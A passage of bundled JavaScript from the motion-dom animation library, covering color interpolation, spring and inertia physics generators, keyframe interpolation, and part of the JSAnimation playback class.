	getAnimatableNone: getAnimatableNone$1
};
// node_modules/motion-dom/dist/es/value/types/color/hsla-to-rgba.mjs
function hueToRgb(p, q, t) {
	if (t < 0) t += 1;
	if (t > 1) t -= 1;
	if (t < 1 / 6) return p + (q - p) * 6 * t;
	if (t < 1 / 2) return q;
	if (t < 2 / 3) return p + (q - p) * (2 / 3 - t) * 6;
	return p;
}
function hslaToRgba({ hue, saturation, lightness, alpha }) {
	hue /= 360;
	saturation /= 100;
	lightness /= 100;
	let red = 0;
	let green = 0;
	let blue = 0;
	if (!saturation) red = green = blue = lightness;
	else {
		const q = lightness < .5 ? lightness * (1 + saturation) : lightness + saturation - lightness * saturation;
		const p = 2 * lightness - q;
		red = hueToRgb(p, q, hue + 1 / 3);
		green = hueToRgb(p, q, hue);
		blue = hueToRgb(p, q, hue - 1 / 3);
	}
	return {
		red: Math.round(red * 255),
		green: Math.round(green * 255),
		blue: Math.round(blue * 255),
		alpha
	};
}
// node_modules/motion-dom/dist/es/utils/mix/immediate.mjs
function mixImmediate(a, b) {
	return (p) => p > 0 ? b : a;
}
// node_modules/motion-dom/dist/es/utils/mix/number.mjs
var mixNumber$1 = (from, to, progress) => {
	return from + (to - from) * progress;
};
// node_modules/motion-dom/dist/es/utils/mix/color.mjs
var mixLinearColor = (from, to, v) => {
	const fromExpo = from * from;
	const expo = v * (to * to - fromExpo) + fromExpo;
	return expo < 0 ? 0 : Math.sqrt(expo);
};
var colorTypes = [
	hex,
	rgba,
	hsla
];
var getColorType = (v) => colorTypes.find((type) => type.test(v));
function asRGBA(color) {
	const type = getColorType(color);
	`${color}`;
	if (!Boolean(type)) return false;
	let model = type.parse(color);
	if (type === hsla) model = hslaToRgba(model);
	return model;
}
var mixColor = (from, to) => {
	const fromRGBA = asRGBA(from);
	const toRGBA = asRGBA(to);
	if (!fromRGBA || !toRGBA) return mixImmediate(from, to);
	const blended = { ...fromRGBA };
	return (v) => {
		blended.red = mixLinearColor(fromRGBA.red, toRGBA.red, v);
		blended.green = mixLinearColor(fromRGBA.green, toRGBA.green, v);
		blended.blue = mixLinearColor(fromRGBA.blue, toRGBA.blue, v);
		blended.alpha = mixNumber$1(fromRGBA.alpha, toRGBA.alpha, v);
		return rgba.transform(blended);
	};
};
// node_modules/motion-dom/dist/es/utils/mix/visibility.mjs
var invisibleValues = /* @__PURE__ */ new Set(["none", "hidden"]);
/**
* Returns a function that, when provided a progress value between 0 and 1,
* will return the "none" or "hidden" string only when the progress is that of
* the origin or target.
*/
function mixVisibility(origin, target) {
	if (invisibleValues.has(origin)) return (p) => p <= 0 ? origin : target;
	else return (p) => p >= 1 ? target : origin;
}
// node_modules/motion-dom/dist/es/utils/mix/complex.mjs
function mixNumber(a, b) {
	return (p) => mixNumber$1(a, b, p);
}
function getMixer(a) {
	if (typeof a === "number") return mixNumber;
	else if (typeof a === "string") return isCSSVariableToken(a) ? mixImmediate : color.test(a) ? mixColor : mixComplex;
	else if (Array.isArray(a)) return mixArray;
	else if (typeof a === "object") return color.test(a) ? mixColor : mixObject;
	return mixImmediate;
}
function mixArray(a, b) {
	const output = [...a];
	const numValues = output.length;
	const blendValue = a.map((v, i) => getMixer(v)(v, b[i]));
	return (p) => {
		for (let i = 0; i < numValues; i++) output[i] = blendValue[i](p);
		return output;
	};
}
function mixObject(a, b) {
	const output = {
		...a,
		...b
	};
	const blendValue = {};
	for (const key in output) if (a[key] !== void 0 && b[key] !== void 0) blendValue[key] = getMixer(a[key])(a[key], b[key]);
	return (v) => {
		for (const key in blendValue) output[key] = blendValue[key](v);
		return output;
	};
}
function matchOrder(origin, target) {
	const orderedOrigin = [];
	const pointers = {
		color: 0,
		var: 0,
		number: 0
	};
	for (let i = 0; i < target.values.length; i++) {
		const type = target.types[i];
		const originIndex = origin.indexes[type][pointers[type]];
		const originValue = origin.values[originIndex] ?? 0;
		orderedOrigin[i] = originValue;
		pointers[type]++;
	}
	return orderedOrigin;
}
var mixComplex = (origin, target) => {
	const template = complex.createTransformer(target);
	const originStats = analyseComplexValue(origin);
	const targetStats = analyseComplexValue(target);
	if (originStats.indexes.var.length === targetStats.indexes.var.length && originStats.indexes.color.length === targetStats.indexes.color.length && originStats.indexes.number.length >= targetStats.indexes.number.length) {
		if (invisibleValues.has(origin) && !targetStats.values.length || invisibleValues.has(target) && !originStats.values.length) return mixVisibility(origin, target);
		return pipe(mixArray(matchOrder(originStats, targetStats), targetStats.values), template);
	} else {
		`${origin}${target}`;
		return mixImmediate(origin, target);
	}
};
// node_modules/motion-dom/dist/es/utils/mix/index.mjs
function mix(from, to, p) {
	if (typeof from === "number" && typeof to === "number" && typeof p === "number") return mixNumber$1(from, to, p);
	return getMixer(from)(from, to);
}
// node_modules/motion-dom/dist/es/animation/drivers/frame.mjs
var frameloopDriver = (update) => {
	const passTimestamp = ({ timestamp }) => update(timestamp);
	return {
		start: (keepAlive = true) => frame.update(passTimestamp, keepAlive),
		stop: () => cancelFrame(passTimestamp),
		/**
		* If we're processing this frame we can use the
		* framelocked timestamp to keep things in sync.
		*/
		now: () => frameData.isProcessing ? frameData.timestamp : time.now()
	};
};
// node_modules/motion-dom/dist/es/animation/waapi/utils/linear.mjs
var generateLinearEasing = (easing, duration, resolution = 10) => {
	let points = "";
	const numPoints = Math.max(Math.round(duration / resolution), 2);
	for (let i = 0; i < numPoints; i++) points += Math.round(easing(i / (numPoints - 1)) * 1e4) / 1e4 + ", ";
	return `linear(${points.substring(0, points.length - 2)})`;
};
// node_modules/motion-dom/dist/es/animation/generators/utils/calc-duration.mjs
/**
* Implement a practical max duration for keyframe generation
* to prevent infinite loops
*/
var maxGeneratorDuration = 2e4;
function calcGeneratorDuration(generator) {
	let duration = 0;
	const timeStep = 50;
	let state = generator.next(duration);
	while (!state.done && duration < 2e4) {
		duration += timeStep;
		state = generator.next(duration);
	}
	return duration >= 2e4 ? Infinity : duration;
}
// node_modules/motion-dom/dist/es/animation/generators/utils/create-generator-easing.mjs
/**
* Create a progress => progress easing function from a generator.
*/
function createGeneratorEasing(options, scale = 100, createGenerator) {
	const generator = createGenerator({
		...options,
		keyframes: [0, scale]
	});
	const duration = Math.min(calcGeneratorDuration(generator), maxGeneratorDuration);
	return {
		type: "keyframes",
		ease: (progress) => {
			return generator.next(duration * progress).value / scale;
		},
		duration: /* @__PURE__ */ millisecondsToSeconds(duration)
	};
}
// node_modules/motion-dom/dist/es/animation/generators/spring.mjs
var springDefaults = {
	stiffness: 100,
	damping: 10,
	mass: 1,
	velocity: 0,
	duration: 800,
	bounce: .3,
	visualDuration: .3,
	restSpeed: {
		granular: .01,
		default: 2
	},
	restDelta: {
		granular: .005,
		default: .5
	},
	minDuration: .01,
	maxDuration: 10,
	minDamping: .05,
	maxDamping: 1
};
function calcAngularFreq(undampedFreq, dampingRatio) {
	return undampedFreq * Math.sqrt(1 - dampingRatio * dampingRatio);
}
var rootIterations = 12;
function approximateRoot(envelope, derivative, initialGuess) {
	let result = initialGuess;
	for (let i = 1; i < rootIterations; i++) result = result - envelope(result) / derivative(result);
	return result;
}
/**
* This is ported from the Framer implementation of duration-based spring resolution.
*/
var safeMin = .001;
function findSpring({ duration = springDefaults.duration, bounce = springDefaults.bounce, velocity = springDefaults.velocity, mass = springDefaults.mass }) {
	let envelope;
	let derivative;
	springDefaults.maxDuration;
	let dampingRatio = 1 - bounce;
	/**
	* Restrict dampingRatio and duration to within acceptable ranges.
	*/
	dampingRatio = clamp(springDefaults.minDamping, springDefaults.maxDamping, dampingRatio);
	duration = clamp(springDefaults.minDuration, springDefaults.maxDuration, /* @__PURE__ */ millisecondsToSeconds(duration));
	if (dampingRatio < 1) {
		/**
		* Underdamped spring
		*/
		envelope = (undampedFreq) => {
			const exponentialDecay = undampedFreq * dampingRatio;
			const delta = exponentialDecay * duration;
			const a = exponentialDecay - velocity;
			const b = calcAngularFreq(undampedFreq, dampingRatio);
			const c = Math.exp(-delta);
			return safeMin - a / b * c;
		};
		derivative = (undampedFreq) => {
			const delta = undampedFreq * dampingRatio * duration;
			const d = delta * velocity + velocity;
			const e = Math.pow(dampingRatio, 2) * Math.pow(undampedFreq, 2) * duration;
			const f = Math.exp(-delta);
			const g = calcAngularFreq(Math.pow(undampedFreq, 2), dampingRatio);
			return (-envelope(undampedFreq) + safeMin > 0 ? -1 : 1) * ((d - e) * f) / g;
		};
	} else {
		/**
		* Critically-damped spring
		*/
		envelope = (undampedFreq) => {
			return -.001 + Math.exp(-undampedFreq * duration) * ((undampedFreq - velocity) * duration + 1);
		};
		derivative = (undampedFreq) => {
			return Math.exp(-undampedFreq * duration) * ((velocity - undampedFreq) * (duration * duration));
		};
	}
	const initialGuess = 5 / duration;
	const undampedFreq = approximateRoot(envelope, derivative, initialGuess);
	duration = /* @__PURE__ */ secondsToMilliseconds(duration);
	if (isNaN(undampedFreq)) return {
		stiffness: springDefaults.stiffness,
		damping: springDefaults.damping,
		duration
	};
	else {
		const stiffness = Math.pow(undampedFreq, 2) * mass;
		return {
			stiffness,
			damping: dampingRatio * 2 * Math.sqrt(mass * stiffness),
			duration
		};
	}
}
var durationKeys = ["duration", "bounce"];
var physicsKeys = [
	"stiffness",
	"damping",
	"mass"
];
function isSpringType(options, keys) {
	return keys.some((key) => options[key] !== void 0);
}
function getSpringOptions(options) {
	let springOptions = {
		velocity: springDefaults.velocity,
		stiffness: springDefaults.stiffness,
		damping: springDefaults.damping,
		mass: springDefaults.mass,
		isResolvedFromDuration: false,
		...options
	};
	if (!isSpringType(options, physicsKeys) && isSpringType(options, durationKeys)) {
		springOptions.velocity = 0;
		if (options.visualDuration) {
			const visualDuration = options.visualDuration;
			const root = 2 * Math.PI / (visualDuration * 1.2);
			const stiffness = root * root;
			const damping = 2 * clamp(.05, 1, 1 - (options.bounce || 0)) * Math.sqrt(stiffness);
			springOptions = {
				...springOptions,
				mass: springDefaults.mass,
				stiffness,
				damping
			};
		} else {
			const derived = findSpring({
				...options,
				velocity: 0
			});
			springOptions = {
				...springOptions,
				...derived,
				mass: springDefaults.mass
			};
			springOptions.isResolvedFromDuration = true;
		}
	}
	return springOptions;
}
function spring(optionsOrVisualDuration = springDefaults.visualDuration, bounce = springDefaults.bounce) {
	const options = typeof optionsOrVisualDuration !== "object" ? {
		visualDuration: optionsOrVisualDuration,
		keyframes: [0, 1],
		bounce
	} : optionsOrVisualDuration;
	let { restSpeed, restDelta } = options;
	const origin = options.keyframes[0];
	const target = options.keyframes[options.keyframes.length - 1];
	/**
	* This is the Iterator-spec return value. We ensure it's mutable rather than using a generator
	* to reduce GC during animation.
	*/
	const state = {
		done: false,
		value: origin
	};
	const { stiffness, damping, mass, duration, velocity, isResolvedFromDuration } = getSpringOptions({
		...options,
		velocity: -/* @__PURE__ */ millisecondsToSeconds(options.velocity || 0)
	});
	const initialVelocity = velocity || 0;
	const dampingRatio = damping / (2 * Math.sqrt(stiffness * mass));
	const initialDelta = target - origin;
	const undampedAngularFreq = /* @__PURE__ */ millisecondsToSeconds(Math.sqrt(stiffness / mass));
	/**
	* If we're working on a granular scale, use smaller defaults for determining
	* when the spring is finished.
	*
	* These defaults have been selected emprically based on what strikes a good
	* ratio between feeling good and finishing as soon as changes are imperceptible.
	*/
	const isGranularScale = Math.abs(initialDelta) < 5;
	restSpeed || (restSpeed = isGranularScale ? springDefaults.restSpeed.granular : springDefaults.restSpeed.default);
	restDelta || (restDelta = isGranularScale ? springDefaults.restDelta.granular : springDefaults.restDelta.default);
	let resolveSpring;
	let resolveVelocity;
	let angularFreq;
	let A;
	let sinCoeff;
	let cosCoeff;
	if (dampingRatio < 1) {
		angularFreq = calcAngularFreq(undampedAngularFreq, dampingRatio);
		A = (initialVelocity + dampingRatio * undampedAngularFreq * initialDelta) / angularFreq;
		resolveSpring = (t) => {
			const envelope = Math.exp(-dampingRatio * undampedAngularFreq * t);
			return target - envelope * (A * Math.sin(angularFreq * t) + initialDelta * Math.cos(angularFreq * t));
		};
		sinCoeff = dampingRatio * undampedAngularFreq * A + initialDelta * angularFreq;
		cosCoeff = dampingRatio * undampedAngularFreq * initialDelta - A * angularFreq;
		resolveVelocity = (t) => {
			return Math.exp(-dampingRatio * undampedAngularFreq * t) * (sinCoeff * Math.sin(angularFreq * t) + cosCoeff * Math.cos(angularFreq * t));
		};
	} else if (dampingRatio === 1) {
		resolveSpring = (t) => target - Math.exp(-undampedAngularFreq * t) * (initialDelta + (initialVelocity + undampedAngularFreq * initialDelta) * t);
		const C = initialVelocity + undampedAngularFreq * initialDelta;
		resolveVelocity = (t) => Math.exp(-undampedAngularFreq * t) * (undampedAngularFreq * C * t - initialVelocity);
	} else {
		const dampedAngularFreq = undampedAngularFreq * Math.sqrt(dampingRatio * dampingRatio - 1);
		resolveSpring = (t) => {
			const envelope = Math.exp(-dampingRatio * undampedAngularFreq * t);
			const freqForT = Math.min(dampedAngularFreq * t, 300);
			return target - envelope * ((initialVelocity + dampingRatio * undampedAngularFreq * initialDelta) * Math.sinh(freqForT) + dampedAngularFreq * initialDelta * Math.cosh(freqForT)) / dampedAngularFreq;
		};
		const P = (initialVelocity + dampingRatio * undampedAngularFreq * initialDelta) / dampedAngularFreq;
		const sinhCoeff = dampingRatio * undampedAngularFreq * P - initialDelta * dampedAngularFreq;
		const coshCoeff = dampingRatio * undampedAngularFreq * initialDelta - P * dampedAngularFreq;
		resolveVelocity = (t) => {
			const envelope = Math.exp(-dampingRatio * undampedAngularFreq * t);
			const freqForT = Math.min(dampedAngularFreq * t, 300);
			return envelope * (sinhCoeff * Math.sinh(freqForT) + coshCoeff * Math.cosh(freqForT));
		};
	}
	const generator = {
		calculatedDuration: isResolvedFromDuration ? duration || null : null,
		velocity: (t) => /* @__PURE__ */ secondsToMilliseconds(resolveVelocity(t)),
		next: (t) => {
			/**
			* For underdamped physics springs we need both position and
			* velocity each tick. Compute shared trig values once to avoid
			* duplicate Math.exp/sin/cos calls on the hot path.
			*/
			if (!isResolvedFromDuration && dampingRatio < 1) {
				const envelope = Math.exp(-dampingRatio * undampedAngularFreq * t);
				const sin = Math.sin(angularFreq * t);
				const cos = Math.cos(angularFreq * t);
				const current = target - envelope * (A * sin + initialDelta * cos);
				const currentVelocity = /* @__PURE__ */ secondsToMilliseconds(envelope * (sinCoeff * sin + cosCoeff * cos));
				state.done = Math.abs(currentVelocity) <= restSpeed && Math.abs(target - current) <= restDelta;
				state.value = state.done ? target : current;
				return state;
			}
			const current = resolveSpring(t);
			if (!isResolvedFromDuration) {
				const currentVelocity = /* @__PURE__ */ secondsToMilliseconds(resolveVelocity(t));
				state.done = Math.abs(currentVelocity) <= restSpeed && Math.abs(target - current) <= restDelta;
			} else state.done = t >= duration;
			state.value = state.done ? target : current;
			return state;
		},
		toString: () => {
			const calculatedDuration = Math.min(calcGeneratorDuration(generator), maxGeneratorDuration);
			const easing = generateLinearEasing((progress) => generator.next(calculatedDuration * progress).value, calculatedDuration, 30);
			return calculatedDuration + "ms " + easing;
		},
		toTransition: () => {}
	};
	return generator;
}
spring.applyToOptions = (options) => {
	const generatorOptions = createGeneratorEasing(options, 100, spring);
	options.ease = generatorOptions.ease;
	options.duration = /* @__PURE__ */ secondsToMilliseconds(generatorOptions.duration);
	options.type = "keyframes";
	return options;
};
// node_modules/motion-dom/dist/es/animation/generators/utils/velocity.mjs
var velocitySampleDuration = 5;
function getGeneratorVelocity(resolveValue, t, current) {
	const prevT = Math.max(t - velocitySampleDuration, 0);
	return /* @__PURE__ */ velocityPerSecond(current - resolveValue(prevT), t - prevT);
}
// node_modules/motion-dom/dist/es/animation/generators/inertia.mjs
function inertia({ keyframes, velocity = 0, power = .8, timeConstant = 325, bounceDamping = 10, bounceStiffness = 500, modifyTarget, min, max, restDelta = .5, restSpeed }) {
	const origin = keyframes[0];
	const state = {
		done: false,
		value: origin
	};
	const isOutOfBounds = (v) => min !== void 0 && v < min || max !== void 0 && v > max;
	const nearestBoundary = (v) => {
		if (min === void 0) return max;
		if (max === void 0) return min;
		return Math.abs(min - v) < Math.abs(max - v) ? min : max;
	};
	let amplitude = power * velocity;
	const ideal = origin + amplitude;
	const target = modifyTarget === void 0 ? ideal : modifyTarget(ideal);
	/**
	* If the target has changed we need to re-calculate the amplitude, otherwise
	* the animation will start from the wrong position.
	*/
	if (target !== ideal) amplitude = target - origin;
	const calcDelta = (t) => -amplitude * Math.exp(-t / timeConstant);
	const calcLatest = (t) => target + calcDelta(t);
	const applyFriction = (t) => {
		const delta = calcDelta(t);
		const latest = calcLatest(t);
		state.done = Math.abs(delta) <= restDelta;
		state.value = state.done ? target : latest;
	};
	/**
	* Ideally this would resolve for t in a stateless way, we could
	* do that by always precalculating the animation but as we know
	* this will be done anyway we can assume that spring will
	* be discovered during that.
	*/
	let timeReachedBoundary;
	let spring$1;
	const checkCatchBoundary = (t) => {
		if (!isOutOfBounds(state.value)) return;
		timeReachedBoundary = t;
		spring$1 = spring({
			keyframes: [state.value, nearestBoundary(state.value)],
			velocity: getGeneratorVelocity(calcLatest, t, state.value),
			damping: bounceDamping,
			stiffness: bounceStiffness,
			restDelta,
			restSpeed
		});
	};
	checkCatchBoundary(0);
	return {
		calculatedDuration: null,
		next: (t) => {
			/**
			* We need to resolve the friction to figure out if we need a
			* spring but we don't want to do this twice per frame. So here
			* we flag if we updated for this frame and later if we did
			* we can skip doing it again.
			*/
			let hasUpdatedFrame = false;
			if (!spring$1 && timeReachedBoundary === void 0) {
				hasUpdatedFrame = true;
				applyFriction(t);
				checkCatchBoundary(t);
			}
			/**
			* If we have a spring and the provided t is beyond the moment the friction
			* animation crossed the min/max boundary, use the spring.
			*/
			if (timeReachedBoundary !== void 0 && t >= timeReachedBoundary) return spring$1.next(t - timeReachedBoundary);
			else {
				!hasUpdatedFrame && applyFriction(t);
				return state;
			}
		}
	};
}
// node_modules/motion-dom/dist/es/utils/interpolate.mjs
function createMixers(output, ease, customMixer) {
	const mixers = [];
	const mixerFactory = customMixer || MotionGlobalConfig.mix || mix;
	const numMixers = output.length - 1;
	for (let i = 0; i < numMixers; i++) {
		let mixer = mixerFactory(output[i], output[i + 1]);
		if (ease) mixer = pipe(Array.isArray(ease) ? ease[i] || noop : ease, mixer);
		mixers.push(mixer);
	}
	return mixers;
}
/**
* Create a function that maps from a numerical input array to a generic output array.
*
* Accepts:
*   - Numbers
*   - Colors (hex, hsl, hsla, rgb, rgba)
*   - Complex (combinations of one or more numbers or strings)
*
* ```jsx
* const mixColor = interpolate([0, 1], ['#fff', '#000'])
*
* mixColor(0.5) // 'rgba(128, 128, 128, 1)'
* ```
*
* TODO Revisit this approach once we've moved to data models for values,
* probably not needed to pregenerate mixer functions.
*
* @public
*/
function interpolate(input, output, { clamp: isClamp = true, ease, mixer } = {}) {
	const inputLength = input.length;
	output.length;
	/**
	* If we're only provided a single input, we can just make a function
	* that returns the output.
	*/
	if (inputLength === 1) return () => output[0];
	if (inputLength === 2 && output[0] === output[1]) return () => output[1];
	const isZeroDeltaRange = input[0] === input[1];
	if (input[0] > input[inputLength - 1]) {
		input = [...input].reverse();
		output = [...output].reverse();
	}
	const mixers = createMixers(output, ease, mixer);
	const numMixers = mixers.length;
	const interpolator = (v) => {
		if (isZeroDeltaRange && v < input[0]) return output[0];
		let i = 0;
		if (numMixers > 1) {
			for (; i < input.length - 2; i++) if (v < input[i + 1]) break;
		}
		const progressInRange = /* @__PURE__ */ progress(input[i], input[i + 1], v);
		return mixers[i](progressInRange);
	};
	return isClamp ? (v) => interpolator(clamp(input[0], input[inputLength - 1], v)) : interpolator;
}
// node_modules/motion-dom/dist/es/animation/keyframes/offsets/fill.mjs
function fillOffset(offset, remaining) {
	const min = offset[offset.length - 1];
	for (let i = 1; i <= remaining; i++) {
		const offsetProgress = /* @__PURE__ */ progress(0, remaining, i);
		offset.push(mixNumber$1(min, 1, offsetProgress));
	}
}
// node_modules/motion-dom/dist/es/animation/keyframes/offsets/default.mjs
function defaultOffset(arr) {
	const offset = [0];
	fillOffset(offset, arr.length - 1);
	return offset;
}
// node_modules/motion-dom/dist/es/animation/keyframes/offsets/time.mjs
function convertOffsetToTimes(offset, duration) {
	return offset.map((o) => o * duration);
}
// node_modules/motion-dom/dist/es/animation/generators/keyframes.mjs
function defaultEasing(values, easing) {
	return values.map(() => easing || easeInOut).splice(0, values.length - 1);
}
function keyframes({ duration = 300, keyframes: keyframeValues, times, ease = "easeInOut" }) {
	/**
	* Easing functions can be externally defined as strings. Here we convert them
	* into actual functions.
	*/
	const easingFunctions = /* @__PURE__ */ isEasingArray(ease) ? ease.map(easingDefinitionToFunction) : easingDefinitionToFunction(ease);
	/**
	* This is the Iterator-spec return value. We ensure it's mutable rather than using a generator
	* to reduce GC during animation.
	*/
	const state = {
		done: false,
		value: keyframeValues[0]
	};
	const mapTimeToKeyframe = interpolate(convertOffsetToTimes(times && times.length === keyframeValues.length ? times : defaultOffset(keyframeValues), duration), keyframeValues, { ease: Array.isArray(easingFunctions) ? easingFunctions : defaultEasing(keyframeValues, easingFunctions) });
	return {
		calculatedDuration: duration,
		next: (t) => {
			state.value = mapTimeToKeyframe(t);
			state.done = t >= duration;
			return state;
		}
	};
}
// node_modules/motion-dom/dist/es/animation/keyframes/get-final.mjs
var isNotNull = (value) => value !== null;
function getFinalKeyframe(keyframes, { repeat, repeatType = "loop" }, finalKeyframe, speed = 1) {
	const resolvedKeyframes = keyframes.filter(isNotNull);
	const index = speed < 0 || repeat && repeatType !== "loop" && repeat % 2 === 1 ? 0 : resolvedKeyframes.length - 1;
	return !index || finalKeyframe === void 0 ? resolvedKeyframes[index] : finalKeyframe;
}
// node_modules/motion-dom/dist/es/animation/utils/replace-transition-type.mjs
var transitionTypeMap = {
	decay: inertia,
	inertia,
	tween: keyframes,
	keyframes,
	spring
};
function replaceTransitionType(transition) {
	if (typeof transition.type === "string") transition.type = transitionTypeMap[transition.type];
}
// node_modules/motion-dom/dist/es/animation/utils/WithPromise.mjs
var WithPromise = class {
	constructor() {
		this.updateFinished();
	}
	get finished() {
		return this._finished;
	}
	updateFinished() {
		this._finished = new Promise((resolve) => {
			this.resolve = resolve;
		});
	}
	notifyFinished() {
		this.resolve();
	}
	/**
	* Allows the animation to be awaited.
	*
	* @deprecated Use `finished` instead.
	*/
	then(onResolve, onReject) {
		return this.finished.then(onResolve, onReject);
	}
};
// node_modules/motion-dom/dist/es/animation/JSAnimation.mjs
var percentToProgress = (percent) => percent / 100;
var JSAnimation = class extends WithPromise {
	constructor(options) {
		super();
		this.state = "idle";
		this.startTime = null;
		this.isStopped = false;
		/**
		* The current time of the animation.
		*/
		this.currentTime = 0;
		/**
		* The time at which the animation was paused.
		*/
		this.holdTime = null;
		/**
		* Playback speed as a factor. 0 would be stopped, -1 reverse and 2 double speed.
		*/
		this.playbackSpeed = 1;
		/**
		* Reusable state object for the delay phase to avoid
		* allocating a new object every frame.
		*/
		this.delayState = {
			done: false,
			value: void 0
		};
		/**
		* This method is bound to the instance to fix a pattern where
		* animation.stop is returned as a reference from a useEffect.
		*/
		this.stop = () => {
			const { motionValue } = this.options;
			if (motionValue && motionValue.updatedAt !== time.now()) this.tick(time.now());
			this.isStopped = true;
			if (this.state === "idle") return;
			this.teardown();
			this.options.onStop?.();
		};
		this.options = options;
		this.initAnimation();
		this.play();
		if (options.autoplay === false) this.pause();
	}
	initAnimation() {
		const { options } = this;
		replaceTransitionType(options);
		const { type = keyframes, repeat = 0, repeatDelay = 0, repeatType, velocity = 0 } = options;
		let { keyframes: keyframes$1 } = options;
		const generatorFactory = type || keyframes;
		if (generatorFactory !== keyframes && typeof keyframes$1[0] !== "number") {
			this.mixKeyframes = pipe(percentToProgress, mix(keyframes$1[0], keyframes$1[1]));
			keyframes$1 = [0, 100];
		}
		const generator = generatorFactory({
			...options,
			keyframes: keyframes$1
		});
		/**
		* If we have a mirror repeat type we need to create a second generator that outputs the
		* mirrored (not reversed) animation and later ping pong between the two generators.
		*/
		if (repeatType === "mirror") this.mirroredGenerator = generatorFactory({
			...options,
			keyframes: [...keyframes$1].reverse(),
			velocity: -velocity
		});
		/**
		* If duration is undefined and we have repeat options,
		* we need to calculate a duration from the generator.
		*
		* We set it to the generator itself to cache the duration.
		* Any timeline resolver will need to have already precalculated
		* the duration by this step.
		*/
		if (generator.calculatedDuration === null) generator.calculatedDuration = calcGeneratorDuration(generator);
		const { calculatedDuration } = generator;
		this.calculatedDuration = calculatedDuration;
		this.resolvedDuration = calculatedDuration + repeatDelay;
		this.totalDuration = this.resolvedDuration * (repeat + 1) - repeatDelay;
		this.generator = generator;
	}
	updateTime(timestamp) {
		const animationTime = Math.round(timestamp - this.startTime) * this.playbackSpeed;
		if (this.holdTime !== null) this.currentTime = this.holdTime;
		else this.currentTime = animationTime;
	}
	tick(timestamp, sample = false) {
		const { generator, totalDuration, mixKeyframes, mirroredGenerator, resolvedDuration, calculatedDuration } = this;
		if (this.startTime === null) return generator.next(0);
		const { delay = 0, keyframes, repeat, repeatType, repeatDelay, type, onUpdate, finalKeyframe } = this.options;
		/**
		* requestAnimationFrame timestamps can come through as lower than
		* the startTime as set by performance.now(). Here we prevent this,
		* though in the future it could be possible to make setting startTime
		* a pending operation that gets resolved here.
		*/
		if (this.speed > 0) this.startTime = Math.min(this.startTime, timestamp);
		else if (this.speed < 0) this.startTime = Math.min(timestamp - totalDuration / this.speed, this.startTime);
		if (sample) this.currentTime = timestamp;
		else this.updateTime(timestamp);
		const timeWithoutDelay = this.currentTime - delay * (this.playbackSpeed >= 0 ? 1 : -1);
		const isInDelayPhase = this.playbackSpeed >= 0 ? timeWithoutDelay < 0 : timeWithoutDelay > totalDuration;
		this.currentTime = Math.max(timeWithoutDelay, 0);
		if (this.state === "finished" && this.holdTime === null) this.currentTime = totalDuration;
		let elapsed = this.currentTime;
		let frameGenerator = generator;
		if (repeat) {
			/**
			* Get the current progress (0-1) of the animation. If t is >
			* than duration we'll get values like 2.5 (midway through the
			* third iteration)
			*/
			const progress = Math.min(this.currentTime, totalDuration) / resolvedDuration;
			/**
			* Get the current iteration (0 indexed). For instance the floor of
			* 2.5 is 2.
			*/
			let currentIteration = Math.floor(progress);
			/**
			* Get the current progress of the iteration by taking the remainder
			* so 2.5 is 0.5 through iteration 2
			*/
			let iterationProgress = progress % 1;
			/**
			* If iteration progress is 1 we count that as the end
			* of the previous iteration.
			*/
			if (!iterationProgress && progress >= 1) iterationProgress = 1;
			iterationProgress === 1 && currentIteration--;
			currentIteration = Math.min(currentIteration, repeat + 1);
			if (Boolean(currentIteration % 2)) {
				if (repeatType === "reverse") {
					iterationProgress = 1 - iterationProgress;
					if (repeatDelay) iterationProgress -= repeatDelay / resolvedDuration;
				} else if (repeatType === "mirror") frameGenerator = mirroredGenerator;
			}
			elapsed = clamp(0, 1, iterationProgress) * resolvedDuration;
		}
		/**
		* If we're in negative time, set state as the initial keyframe.
		* This prevents delay: x, duration: 0 animations from finishing
		* instantly.
		*/
		let state;
		if (isInDelayPhase) {
			this.delayState.value = keyframes[0];
			state = this.delayState;
		} else state = frameGenerator.next(elapsed);
		if (mixKeyframes && !isInDelayPhase) state.value = mixKeyframes(state.value);
		let { done } = state;
		if (!isInDelayPhase && calculatedDuration !== null) done = this.playbackSpeed >= 0 ? this.currentTime >= totalDuration : this.currentTime <= 0;
		const isAnimationFinished = this.holdTime === null && (this.state === "finished" || this.state === "running" && done);
		if (isAnimationFinished && type !== inertia) state.value = getFinalKeyframe(keyframes, this.options, finalKeyframe, this.speed);
		if (onUpdate) onUpdate(state.value);
		if (isAnimationFinished) this.finish();
		return state;
	}
	/**
	* Allows the returned animation to be awaited or promise-chained. Currently
	* resolves when the animation finishes at all but in a future update could/should
	* reject if its cancels.
	*/
	then(resolve, reject) {
		return this.finished.then(resolve, reject);
	}
	get duration() {
		return /* @__PURE__ */ millisecondsToSeconds(this.calculatedDuration);
	}
	get iterationDuration() {
		const { delay = 0 } = this.options || {};
		return this.duration + /* @__PURE__ */ millisecondsToSeconds(delay);
	}
	get time() {
		return /* @__PURE__ */ millisecondsToSeconds(this.currentTime);
	}
	set time(newTime) {
		newTime = /* @__PURE__ */ secondsToMilliseconds(newTime);
		this.currentTime = newTime;
		if (this.startTime === null || this.holdTime !== null || this.playbackSpeed === 0) this.holdTime = newTime;
		else if (this.driver) this.startTime = this.driver.now() - newTime / this.playbackSpeed;
		if (this.driver) this.driver.start(false);
		else {
			this.startTime = 0;
			this.state = "paused";
			this.holdTime = newTime;
			this.tick(newTime);
		}
	}
	/**
	* Returns the generator's velocity at the current time in units/second.
	* Uses the analytical derivative when available (springs), avoiding
	* the MotionValue's frame-dependent velocity estimation.
	*/
	getGeneratorVelocity() {
		const t = this.currentTime;
		if (t <= 0) return this.options.velocity || 0;
		if (this.generator.velocity) return this.generator.velocity(t);
		const current = this.generator.next(t).value;
		return getGeneratorVelocity((s) => this.generator.next(s).value, t, current);
	}
	get speed() {
		return this.playbackSpeed;
	}
	set speed(newSpeed) {
		const hasChanged = this.playbackSpeed !== newSpeed;
		if (hasChanged && this.driver) this.updateTime(time.now());
		this.playbackSpeed = newSpeed;
		if (hasChanged && this.driver) this.time = /* @__PURE__ */ millisecondsToSeconds(this.currentTime);
	}
	play() {
		if (this.isStopped) return;
		const { driver = frameloopDriver, startTime } = this.options;
		if (!this.driver) this.driver = driver((timestamp) => this.tick(timestamp));
		this.options.onPlay?.();
		const now = this.driver.now();
		if (this.state === "finished") {
			this.updateFinished();
			this.startTime = now;
		} else if (this.holdTime !== null) this.startTime = now - this.holdTime;
		else if (!this.startTime) this.startTime = startTime ?? now;
		if (this.state === "finished" && this.speed < 0) this.startTime += this.calculatedDuration;
		this.holdTime = null;
		/**
		* Set playState to running only after we've used it in
		* the previous logic.
		*/
